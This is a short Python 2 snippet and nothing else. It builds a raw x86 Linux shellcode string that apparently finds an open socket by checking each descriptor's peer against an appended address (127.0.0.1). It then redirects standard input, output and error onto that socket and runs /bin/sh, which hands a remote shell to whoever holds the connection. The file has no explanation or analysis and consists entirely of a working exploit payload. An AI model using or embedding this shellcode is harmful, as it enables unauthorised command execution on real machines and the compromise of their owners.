import socket

shellcode = ""
shellcode += "\xE9\x87\x00\x00\x00\x5E\x6A\x10\x89\xE0\x83\xEC\x10\x89\xE3\x50"
shellcode += "\x53\x6A\x00\xFF\x04\x24\x81\x3C\x24\x01\x04\x00\x00\x74\x65\xC7"
shellcode += "\x44\x24\x1C\x10\x00\x00\x00\x89\xE1\xBB\x07\x00\x00\x00\xB8\x66"
shellcode += "\x00\x00\x00\xCD\x80\x83\xF8\x00\x7C\xD9\x8B\x44\x24\x10\x3B\x06"
shellcode += "\x75\xD1\x8B\x3C\x24\x83\xC6\x04\xB8\x3F\x00\x00\x00\x89\xFB\xB9"
shellcode += "\x00\x00\x00\x00\xCD\x80\xB8\x3F\x00\x00\x00\x89\xFB\xB9\x01\x00"
shellcode += "\x00\x00\xCD\x80\xB8\x3F\x00\x00\x00\x89\xFB\xB9\x03\x00\x00\x00"
shellcode += "\xCD\x80\xB8\x0B\x00\x00\x00\x89\xF3\x6A\x00\x56\x89\xE1\x6A\x00"
shellcode += "\x89\xE2\xCD\x80\x31\xC0\x40\x89\xC3\xCD\x80\xF4\xE8\x74\xFF\xFF"
shellcode += "\xFF"
shellcode += socket.inet_aton("127.0.0.1")
shellcode += "/bin/sh\x00"
